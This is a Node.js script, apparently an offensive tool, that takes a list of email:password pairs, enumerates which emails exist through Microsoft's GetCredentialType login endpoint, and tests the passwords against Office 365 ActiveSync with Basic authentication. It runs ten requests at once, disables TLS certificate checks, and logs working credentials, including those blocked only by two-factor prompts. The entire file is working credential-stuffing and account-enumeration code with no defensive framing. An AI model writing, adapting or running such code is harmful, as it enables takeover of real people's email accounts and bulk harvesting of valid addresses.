const fs = require('fs')
const request = require('request')
const lineReader = require('line-reader');
process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

stream = fs.createWriteStream("valid_emails.txt", {flags:'a'});

emails = []
start_index = 0
//temp value defined after parsing the file
end_index = 0
threads = 0
threads_limit = 10

var user_pass_file = process.argv[2]
var mode = process.argv[3]

FgRed = "\x1b[31m"
FgGreen = "\x1b[32m"
FgBlue = "\x1b[34m"
FgCyan = "\x1b[36m"

function is_email_valid(cred){
  let email = cred.split(':')[0]
  if(mode == 2){
    is_password_valid(cred)
  }else{

    let bodyString = `{"Username":"${email}"}`
    
    let headers = {
        "Connection": "close", 
        "Accept-Encoding": "identity", 
        "Accept": "*/*", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", 
        "Content-Length": bodyString.length
    }
    
    let options = {
        url: "https://login.microsoftonline.com/common/GetCredentialType",
        headers: headers,
        method: "post",
        body: bodyString
    }
    request(options, function (error, response, body) {
      let email_status = JSON.parse(body).IfExistsResult
      if(email_status == 0){
        stream.write(email + "\n")
        console.log(FgBlue, `[*] VALID_EMAIL: ${email}`)
        if(mode == 1){
          threads -= 1
          thread_api()
        }else{
          is_password_valid(cred)
        }
      }else{
        console.log(FgCyan, `[-] UNKNOWN_EMAIL: ${email}`)
        threads -= 1
        thread_api()
      }
    })
  }
}

function is_password_valid(cred){
  let encoded = Buffer.from(cred).toString('base64')
  let headers = {
      "Connection": "close", 
      "Accept-Encoding": "gzip, deflate", 
      "Accept": "*/*", 
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko", 
      "MS-ASProtocolVersion": "14.0", 
      "Content-Length": "0", 
      "Authorization": `Basic ${encoded}`
  }
  
  let options = {
      url: "https://outlook.office365.com:443/Microsoft-Server-ActiveSync",
      headers: headers,
      method: "options"
  }
  request(options, function (error, response, body) {
    if(response.statusCode == 403){
      console.log(FgGreen, `[+] SUCCESS (But 2FA): ${cred}`)
    }else if(response.statusCode == 200){
      console.log(FgGreen, `[+] SUCCESS: ${cred}`)
    }else{
      console.log(FgRed, `[-] fail: ${cred}`)
    }
    threads -= 1
    thread_api()
  })
}

function thread_api(){
  while((start_index <= end_index) && (threads <= threads_limit)){
    is_email_valid(emails[start_index])
    start_index += 1
    threads += 1
  }
}

emails = fs.readFileSync(user_pass_file, 'utf8').split('\n');
emails = emails.filter(function (str) { return str.indexOf('@') !== -1; })
end_index = emails.length - 1
thread_api()
